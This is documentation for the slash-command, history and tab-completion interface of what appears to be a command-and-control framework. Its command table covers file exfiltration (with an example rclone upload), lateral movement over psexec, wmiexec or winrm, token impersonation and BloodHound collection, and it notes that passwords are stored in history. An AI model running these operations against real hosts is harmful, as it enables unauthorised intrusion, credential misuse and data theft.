# CLI and Web UI — slash commands and completion

Internal commands in the interactive CLI and WebUI require a leading `/`, for example `/screenshot`. Typing `/` opens the available commands immediately; each keystroke filters the list without a network request. Commands without `/` follow the remote shell path. Unknown slash commands are rejected locally.

This is an interactive syntax change. One-shot CLI arguments (`python rmm_cli.py health`), REST endpoints, MCP tool names, and agent dispatch payloads retain their existing syntax. Use `cmd:` or `PS:` to send a literal remote command that begins with `/`.

## Features

The table below describes the WebUI. CLI Enter dispatches the entered command;
use `/exec <command>` for execution with a wait in the CLI.

| Key | Action |
|-----|--------|
| **↑ / ↓** | Select a slash suggestion while the menu is open; otherwise navigate session history |
| **Tab** | Insert the selected slash command; otherwise complete history and dispatch prefixes |
| **Escape** | Close the slash suggestion menu |
| **Shift+Tab** | Select the previous slash suggestion; outside the menu, cycle history completion backward |
| **Enter** | Queue for next beacon |
| **Ctrl+Enter** | Run and wait (`/exec`) |

The slash menu lists matching internal commands. Ordinary shell input retains its history completion hint.

## History sources

1. Commands echoed in the console (`appendShellEcho`) — includes tool actions like `/download …`
2. Events reloaded from `GET /api/v1/sessions/{id}/events` — operator `queued:` / `exec:` actions and `output` events with `command`. Structured command fields take precedence over legacy body text. Tool, configuration, and pivot audit labels are excluded because they are not replayable shell input.
3. SQLite UI state key `rmm_shell_history` — last 100 commands per session id;
   browser storage remains a short-lived cache.

New internal command echoes retain their slash prefix. Panel-only actions that
cannot be replayed as shell commands use `appendShellEcho` with `remember: false`
(for example, browser file uploads). Existing archived event commands are not
automatically rewritten: bare internal commands from older versions need `/`
added before replay.

`extractShellCommandFromEvent` applies the replayable-action filter before
`rebuildShellHistoryFromEvents` and `seedShellHistory` merge events with stored
input. A raw remote command such as `queued: screenshot` stays unprefixed;
an exfiltration audit label cannot overwrite the original `/exfil` input's
profile or execution semantics when a session is reloaded.

## Completion sources

- Session command history (most recent first in candidate list)
- Static agent dispatch prefixes: `cmd:`, `PS:`, `powershell:`, `pwsh:`; Tab completion inserts the trailing space
- Slash command suggestions: `/help`, `/?`, `/exfil`, `/download`, `/screenshot`, `/pe`, `/spawn`, `/make_token`, `/rev2self`, `/lateral`, `/uid`, `/embeddings`, `/bloodhound`

Agent-side path completion is out of scope (tech plan §4 v2).

## Operator meta commands (shell)

These commands are handled in the browser instead of being sent to the agent shell. Commands that queue an action POST to the operator API:

| Command | API | Notes |
|---------|-----|-------|
| `/help` | — | Shows this local command reference |
| `/?` | — | Alias for `/help` |
| `/download <remote_path>` | `POST …/download` | Spaces in path: quote or omit extra tokens are joined |
| `/exfil <remote_path> [profile]` | `POST …/exfil` | File or folder; profile defaults to Exfil panel / server default |
| `/screenshot` | `POST …/screenshot` | No arguments |
| `/embeddings run <profile> --document <path>` | `POST /api/v1/embeddings/run` | Uses the selected session and a saved profile; repeat `--document` for up to 32 paths; quoted Windows and UNC backslashes are preserved |
| `/pe <plugin> [export] [input]` | `POST …/pe` | Loads a Go PE plugin through the selected agent; export defaults to `Run` |
| `/spawn` | `POST …/spawn` | Starts a detached second Go agent from the selected Go session with a fresh session ID; the request waits for registration and verifies both sessions (see `docs/go-agent.md`) |
| `/make_token <domain\user \| user> <password>` | `POST …/make_token` | Creates a `runas /netonly` style network identity on the selected Go session; identity and password are passed as parameters |
| `/rev2self` | `POST …/rev2self` | Reverts the selected Go session to its own network identity |
| `/uid` | `POST …/uid` | Shows the identity used by the selected Go agent (process user + active network identity) |
| `/lateral <psexec\|wmiexec\|winrm> <host>` | `POST …/lateral` | Starts a Go agent on another host through the requested method; the request waits for registration and verifies both sessions (see `docs/go-agent.md`) |
| `/bloodhound ACTION [--run-id ID] [--options-json JSON]` | `POST /api/v1/bloodhound` | All workflow/library actions run at the workspace owner; quote JSON with single quotes. Use `result` for relay responses and `status` for collection/import progress. Invalid syntax never reaches the agent. |

BloodHound shell output includes the HTTP status and response data. The shell
remains inside a selected session view; use CLI or MCP for advanced actions
without selecting an agent. The main page retains **Open BloodHound**.

The REST, CLI, and MCP surfaces also support plugin-owned command dispatch by
passing `command`. Those commands remain in the plugin and are not added to
the browser shell parser.

Example: `/exfil C:\Users\…\file.iso mega-lab` queues rclone upload; it is not passed to `cmd.exe`.

## Files

- `web/app.js` — `rememberShellCommand`, `navigateShellHistory`, `applyShellTabCompletion` preserve history completion. `getShellCompletionCandidates` filters slash commands. `updateShellCompletionHint` opens the menu; `bindShellInputCompletion` refreshes it on input.
- `closeShellCommandMenu` dismisses suggestions and clears ARIA state; `renderShellCommandMenu` creates the selectable options; `acceptShellCommandCompletion` inserts a command without running it.
- `web/index.html` — `#shell-completion-hint` and the `#shell-command-menu` listbox.
- `web/style.css` — completion hint and menu styles.
- `rmm_cli.py` — `RmmCliPTKCompleter` generates slash and argument completions; `run_interactive` configures live suggestions. Its `dismiss_completions` binding closes them on Escape and `accept_completion` inserts the selected command on Tab. `RmmCliCompleter` retains compatible slash syntax for readline callers.

## CLI behavior

The standalone interactive console uses `prompt_toolkit` (required by `requirements.txt`).
Type `/help` for its complete internal command list. `/use`, `/kill`, and `/spawn` offer session-prefix completion; `/lateral` offers `psexec`, `wmiexec`, and `winrm` in both CLI completers. The WebUI also completes `/lateral` methods. `/upload` retains local-path completion. The WebUI lists only commands supported by its shell; other operations remain available through its panels. Existing history entries using bare internal commands must be edited to add `/` before reuse.

## Validation

`make check-cli` exercises CLI dispatch and real `prompt_toolkit` keyboard input.
`make check-web-contracts` includes completion, routing, and history tests using
the Node DOM fixture. `make check-parity` checks existing API/MCP mappings and
shared interactive commands (the WebUI `/embeddings` command uses `/pe` in the
CLI REPL). All three are included in `make check`. These checks do not replace
a live browser and connected-agent acceptance test.

### Password arguments

`parse_identity_arguments` parses interactive CLI `/make_token` arguments using
single or double quotes and literal backslashes, matching WebUI `parseShellWords`.
Quote passwords containing spaces; `""` passes an empty password. An unclosed
quote is rejected locally. For example, `/make_token LAB\alice 'two words\path'`
passes the literal password `two words\path`. Commands remain visible and are
saved verbatim in CLI and WebUI history, including passwords. Server identity
audit events record the identity label without the password.
